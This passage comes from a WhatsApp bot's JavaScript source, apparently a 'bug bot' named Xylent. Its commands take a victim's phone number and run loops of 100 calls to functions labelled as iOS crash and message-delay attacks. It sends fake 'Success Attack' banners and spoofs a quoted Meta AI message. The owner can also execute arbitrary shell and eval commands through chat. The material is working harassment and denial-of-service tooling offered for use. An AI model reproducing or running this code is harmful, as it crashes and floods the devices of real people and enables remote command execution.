    { upload: xylent.waUploadToServer }
  );

  // Menyiapkan konfigurasi button native flow
  const nativeButtons = proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
    buttons: [
      {
        name: "cta_url",
        buttonParamsJson: `{"display_text":"Check Target","url":"https://wa.me/${target}","merchant_url":"https://www.google.com"}`
      }
    ]
  });

  // Membuat struktur pesan interaktif carousel dalam pembungkus ephemeralMessage
  let msgProcess = await generateWAMessageFromContent(from, {
    ephemeralMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        }, 
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: "",
          }), 
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [{
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `\`「 Xylent Attack WhatsApp 」\`\n\n• Target: ${target}\n• Type Bug: ${command}\n• Status: Success Attack ✅\n> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`,
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: nativeButtons
            }]
          }),
          contextInfo: {
            stanzaId: "META_AI_FAKE",
            participant: "13135550002@s.whatsapp.net",
            quotedMessage: metaFakeQuoted.message
          }
        })
      }
    }
  }, { quoted: metaFakeQuoted });

  // Mengirimkan pesan interaktif ke room chat
  await xylent.relayMessage(from, msgProcess.message, { messageId: msgProcess.key.id });

  // Eksekusi perulangan fungsi eksternal
  for (let i = 0; i < 100; i++) {
await iosinVisFC3(target);
await IosCrashParsing(target);
  }
}
break;

case 'tryfunc': {
if (!isCreator && !isPremium && !isUnli) return ReplyXylent(mess.owner);
if (!q) return ReplyXylent(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await replybug(`\`「 Xylent Attack WhatsApp 」\`
 Target  : ${target}
 Type Bug  : ${command}
 Status  : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`)
for (let i = 0; i < 100; i++) {
await LyoraaXui(xylent, target);
await LyoraaXui(xylent, target);
await AsTDelayHarod(xylent, target);
await AsTDelayHarod(xylent, target);
}
}
break
// END TOD
                default:
                if (budy.startsWith('$')) {
                    if (!isCreator) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return ReplyXylent(err)
                        if (stdout) return ReplyXylent(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!isCreator) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await payeply(evaled);
                    } catch (err) {
                        ReplyXylent(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isCreator) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await ReplyXylent(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})